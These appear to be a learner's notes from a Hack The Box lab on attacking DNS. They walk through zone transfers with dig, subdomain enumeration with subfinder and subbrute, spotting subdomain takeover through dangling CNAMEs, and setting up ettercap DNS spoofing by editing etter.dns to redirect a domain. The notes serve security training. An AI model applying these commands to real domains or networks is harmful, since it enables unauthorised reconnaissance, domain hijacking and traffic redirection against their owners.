### Enumeration
```shell-session
realCustampin@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
Nmap scan report for 10.10.110.213
Host is up (0.017s latency).

PORT    STATE  SERVICE     VERSION
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```

### DNS Zone Transfer
- Portion of DNS Namespace that a specific organization or administrator messages.
- DNS Servers utilize DNS Zone Transfers to copy portions of data to another DNS Server. 

How can an attacker leverage a DNS Zone Transfer vulnerability?
- Utilizing the dig command with the DNS query type of AXFR to dump the entire DNS namespaces from a vulnerable DNS Server:

```shell-session
realCustampin@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
;; global options: +cmd
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN      AAAA    ::1
inlanefrieght.htb.         604800  IN      NS      localhost.
inlanefrieght.htb.         604800  IN      A       10.129.110.22
admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.110.213#53(10.129.110.213)
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
```

### Domain Takeovers and Subdomain Enumeration
- Domain takeovers are registering a non-existent domain name to gain control over another domain. 

```shell-session
sub.target.com.   60   IN   CNAME   anotherdomain.com
```
- The domain name (e.g., `sub.target.com`) uses a CNAME record to another domain (e.g., `anotherdomain.com`). Suppose the `anotherdomain.com` expires and is available for anyone to claim the domain since the `target.com`'s DNS server has the `CNAME` record. In that case, anyone who registers `anotherdomain.com` will have complete control over `sub.target.com` until the DNS record is updated.

### Subdomain Enumeration 
- We can use subfinder to enumerate the domain for any subdomains: 
```shell-session
realCustampin@htb[/htb]# ./subfinder -d inlanefreight.com -v       
                                                                       
        _     __ _         _                                           
____  _| |__ / _(_)_ _  __| |___ _ _          
(_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
                projectdiscovery.io                    
                                                                       
[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[WRN] By using subfinder, you also agree to the terms of the APIs used. 
                                   
[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took 2.193235338s for enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.com
support.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
```

Another tool that we can use is called Subrute. https://github.com/TheRook/subbrute

```shell-session
realCustampin@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
realCustampin@htb[/htb]$ cd subbrute
realCustampin@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
realCustampin@htb[/htb]$ ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt

Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com

<SNIP>
```


Now we can figure out the CNAME record using the host command: 

```shell-session
realCustampin@htb[/htb]# host support.inlanefreight.com

support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

We can also go to this link below to view more on the Domain Takeover Vulnerability 
https://github.com/EdOverflow/can-i-take-over-xyz

### DNS Spoofing
- Also referred to DNS Cache Poisoning, involves altering legitimate DNS records with false information so the they can be used to redirect online traffic to a fraudulent website.

- An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (`MITM`) attack. 
- Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.

**Local DNS Cache Poisoning**
- We can perform a DNS Cache Poisoning via MITM attack using Ettercap or Bettercap

We first need to make the changes to the etter.dns file with the target domain and the attackers IP Address: 
```shell-session
realCustampin@htb[/htb]# cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

Next, we can start ettercap and look at the devices that pop up: 
![[Pasted image 20251102163927.png]]
- We need to add the target IP to target1 and add a default gateway to target2

Now that we have that set up, we can initiate the attack by going into Plugins > Mange Plugins and selecting the dns_spoof which sendds fake DNS Responses that will resolve inlanefreight.com to IP address 192.168.225.110: 

![[Pasted image 20251102164229.png]]
